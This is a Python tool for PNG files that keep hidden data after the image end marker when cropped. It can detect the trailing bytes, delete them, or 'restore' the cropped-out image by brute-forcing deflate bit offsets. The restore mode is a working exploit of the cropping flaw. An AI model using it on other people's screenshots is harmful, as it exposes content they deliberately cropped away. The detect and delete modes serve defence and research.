import zlib
import sys
import io
from PIL import Image
from math import ceil
import numpy as np
import argparse
import struct


def parse_args():
    parser = argparse.ArgumentParser(description="A tool for restoring hidden data in PNG files.")
    subparsers = parser.add_subparsers(dest='command')

    detect_parser = subparsers.add_parser('detect', help="Detect and display the trailing bytes length.")
    detect_parser.add_argument('cropped', help="The input cropped PNG file.")

    delete_parser = subparsers.add_parser('delete', help="Delete the hidden data.")
    delete_parser.add_argument('cropped', help="The input cropped PNG file.")
    delete_parser.add_argument('output', help="The output PNG file without trailing data.")

    restore_parser = subparsers.add_parser('restore', help="Restore the hidden data and create a new PNG image.")
    restore_parser.add_argument('type_exploit', choices=['pixel', 'windows'], help="Type of exploit: 'pixel' or 'windows'.")
    restore_parser.add_argument('cropped', help="The input cropped PNG file.")
    restore_parser.add_argument('reconstructed', help="The output reconstructed PNG file.")

    args = parser.parse_args()
    return args, parser
    
    
    
PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
IEND_CHUNK = b'IEND'

# Function to read a PNG chunk
def read_chunk(file):
    length_bytes = file.read(4)
    if not length_bytes:
        return None
    length = struct.unpack('!I', length_bytes)[0]
    chunk_type = file.read(4)
    data = file.read(length)
    crc = file.read(4)
    return (chunk_type, data, crc)

# Function to remove data after IEND chunk
def remove_data_after_iend(input_file, output_file):
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        signature = f_in.read(len(PNG_MAGIC))
        if signature != PNG_MAGIC:
            print("The file is not a valid PNG file.")
            return

        f_out.write(signature)
        while True:
            chunk = read_chunk(f_in)
            if not chunk:
                break

            chunk_type, data, crc = chunk
            f_out.write(struct.pack('!I', len(data)))
            f_out.write(chunk_type)
            f_out.write(data)
            f_out.write(crc)

            if chunk_type == IEND_CHUNK:
                break

# Function to parse PNG chunks
def parse_png_chunk(stream):
    size = int.from_bytes(stream.read(4), "big")
    ctype = stream.read(4)
    body = stream.read(size)
    csum = int.from_bytes(stream.read(4), "big")
    assert(zlib.crc32(ctype + body) == csum)
    return ctype, body

# Function to pack PNG chunks
def pack_png_chunk(stream, name, body):
    stream.write(len(body).to_bytes(4, "big"))
    stream.write(name)
    stream.write(body)
    crc = zlib.crc32(body, zlib.crc32(name))
    stream.write(crc.to_bytes(4, "big"))

# Function to process trailing bytes
def trailing_bytes(input_file):
    with open(input_file, "rb") as f_in:
        magic = f_in.read(len(PNG_MAGIC))
        assert(magic == PNG_MAGIC)
        while True:
            ctype, body = parse_png_chunk(f_in)
            if ctype == b"IEND":
                break

        trailer = f_in.read()
    print(f"Found {len(trailer)} trailing bytes!")

    try:
        next_idat = trailer.index(b"IDAT", 12)
    except ValueError:
        print("No trailing IDATs found :(")
        sys.exit()

    idat = trailer[12:next_idat-8]

    stream = io.BytesIO(trailer[next_idat-4:])
    return idat, stream

# Function to extract IDAT chunk
def extract_idat(idat, stream):
    while True:
        ctype, body = parse_png_chunk(stream)
        if ctype == b"IDAT":
            idat += body
        elif ctype == b"IEND":
            break
        else:
            raise Exception("Unexpected chunk type: " + repr(ctype))

    idat = idat[:-4]

    print(f"Extracted {len(idat)} bytes of idat!")
    return idat

# Function to build a bitstream from IDAT chunk
def build_bitstream(idat):
    print("Building bitstream...")
    bitstream = []
    for byte in idat:
        for bit in range(8):
            bitstream.append((byte >> bit) & 1)

    for _ in range(7):
        bitstream.append(0)
    return bitstream

# Function to reconstruct bit-shifted bytestreams
def bitshifted(bitstream):
    print("Reconstructing bit-shifted bytestreams...")
    byte_offsets = []
    bitstream_np = np.array(bitstream)

    for i in range(8):
        indices = np.arange(i, len(bitstream)-7, 8).reshape(-1, 1)
        bit_indices = np.arange(8)
        shifted_bits = bitstream_np[indices + bit_indices] << bit_indices
        shifted_bytestream = np.sum(shifted_bits, axis=1).astype(np.uint8)
        byte_offsets.append(shifted_bytestream.tobytes())

    assert(byte_offsets[0] == idat)
    assert(byte_offsets[1] != idat)
    return byte_offsets

# Function to find viable parses
def parses(idat, byte_offsets):
    print("Scanning for viable parses...")

    prefix = b"\x00" + (0x8000).to_bytes(2, "little") + (0x8000 ^ 0xffff).to_bytes(2, "little") + b"X" * 0x8000

    for i in range(len(idat)):
        truncated = byte_offsets[i % 8][i // 8:]

        if truncated[0] & 7 != 0b100:
            continue

        d = zlib.decompressobj(wbits=-15)
        try:
            decompressed = d.decompress(prefix + truncated) + d.flush(zlib.Z_FINISH)
            decompressed = decompressed[0x8000:]

            if d.eof and d.unused_data in [b"", b"\x00"]:
                print(f"Found viable parse at bit offset {i}!")
                break
            else:
                print(f"Parsed until the end of a zlib stream, but there was still {len(d.unused_data)} byte of remaining data. Skipping.")
        except zlib.error as e:
            pass
    else:
        print("Failed to find viable parse :(")
        sys.exit()

    print("decompressed length = {}".format(len(decompressed)))
    return decompressed

def parsesv2(idat, byte_offsets):
    print("Scanning for viable parses...")

    prefix = b"\x00" + (0x8000).to_bytes(2, "little") + (0x8000 ^ 0xffff).to_bytes(2, "little") + b"X" * 0x8000

    for i in range(len(idat)):
        truncated = byte_offsets[i % 8][i // 8:]

        if truncated[0] & 7 != 0b100:
            continue

        d = zlib.decompressobj(wbits=-15)
        try:
            decompressed = d.decompress(prefix + truncated) + d.flush(zlib.Z_FINISH)
            decompressed = decompressed[0x8000:]

            unused_data = np.frombuffer(d.unused_data, dtype=np.uint8)

            if d.eof and unused_data.size in [0, 1] and (unused_data == 0).all():
                print(f"Found viable parse at bit offset {i}!")
                break
            else:
                print(f"Parsed until the end of a zlib stream, but there were still {len(d.unused_data)} bytes of remaining data. Skipping.")
        except zlib.error as e:
            pass
    else:
        print("Failed to find viable parse :(")
        exit()

    print("len(decompressed) = {}".format(len(decompressed)))
    return decompressed
    
# Function to create an image from decompressed data
def create_image(height, width, type_exploit, decompressed):
    ihdr = width.to_bytes(4, "big") + height.to_bytes(4, "big") + (8).to_bytes(1, "big")
    ihdr += (2 if type_exploit == "pixel" else 6).to_bytes(1, "big")
    ihdr += (0).to_bytes(3, "big")  # compression method, filter method, interlace method
    channels = 3 if type_exploit == "pixel" else 4
    if type_exploit == "pixel":
        reconstructed_idat = bytearray((b"\x00" + b"\xff\x00\xff" * width) * height)
    elif type_exploit == "windows":
        reconstructed_idat = bytearray((b"\x00" + b"\xff\x00\xff\xff" * width) * height)
    reconstructed_idat[-len(decompressed):] = decompressed
    for i in range(0, len(reconstructed_idat), width * channels + 1):
        if reconstructed_idat[i] == ord("X"):
            reconstructed_idat[i] = 0

    return zlib.compress(reconstructed_idat), ihdr


# Function to generate output PNG file
def generate_png(height, width, type_exploit, decompressed):
    with open(sys.argv[4], "wb") as out:
        PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
        out.write(PNG_MAGIC)
        idat_compressed, ihdr = create_image(height, width, type_exploit, decompressed)
        pack_png_chunk(out, b"IHDR", ihdr)
        pack_png_chunk(out, b"IDAT", idat_compressed)
        pack_png_chunk(out, b"IEND", b"")
    out.close()
    return Image.open(sys.argv[4])

# Function to find final image dimensions
def find_final_width(height, width, type_exploit, decompressed):
    print("Generating output PNG...")
    valid_width = width
    valid_height = 0
    width_increment = 1

    while True:
        
        try:
            generate_png(height, valid_width, type_exploit, decompressed).load()
            break
        except:
            valid_width += width_increment
            if valid_width %10 == 0 : print("Width > {} pixels".format(valid_width))

    for i in range(valid_width, valid_width + 5):
        try:
            valid_height = find_final_height(i, type_exploit, decompressed)
            generate_png(valid_height, i, type_exploit, decompressed).load()
            valid_width = i
        except:
            continue

    return valid_width
    
    
def find_final_height(wid,type_exploit, decompressed) : 
    # (4Width +1) * Height >= len(decompressed)
    if type_exploit == "windows" : return ceil(len(decompressed) / (wid*4 +1))
    if type_exploit == "pixel" : return ceil(len(decompressed) / (wid*3 +1))
# Main function
if __name__ == '__main__':
    args, parser = parse_args()
    
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit()

    option = sys.argv[1]

    if option == "detect":
        _, _ = trailing_bytes(sys.argv[2])
        print("The image is vulnerable")
        sys.exit()

    elif option == "delete":
        if len(sys.argv) != 4:
            parser.print_help()
            sys.exit()
        else:
            remove_data_after_iend(sys.argv[2], sys.argv[3])
            print("Data after IEND marker has been removed and the new file has been saved as '{}'".format(sys.argv[3]))
            sys.exit()

    elif option == "restore":
        if len(sys.argv) != 5 or sys.argv[2] not in ["pixel", "windows"]:
            parser.print_help()
            sys.exit()
        else:
            type_exploit = sys.argv[2]
            cropped_img = Image.open(sys.argv[3])

            idat, stream = trailing_bytes(sys.argv[3])
            idat = extract_idat(idat, stream)
            bitstream = build_bitstream(idat)
            bitshifted_bytestream = bitshifted(bitstream)
            decompressed = parsesv2(idat, bitshifted_bytestream)

            width, _ = cropped_img.size
            height = ceil(len(decompressed) ** 0.5)

            valid_width = find_final_width(height, width, type_exploit, decompressed)
            valid_height = find_final_height(valid_width, type_exploit, decompressed)
            print("Dimensions found = {}x{}".format(valid_width, valid_height))
            generate_png(valid_height, valid_width, type_exploit, decompressed).show()
            sys.exit()

    else:
        parser.print_help()
        sys.exit()

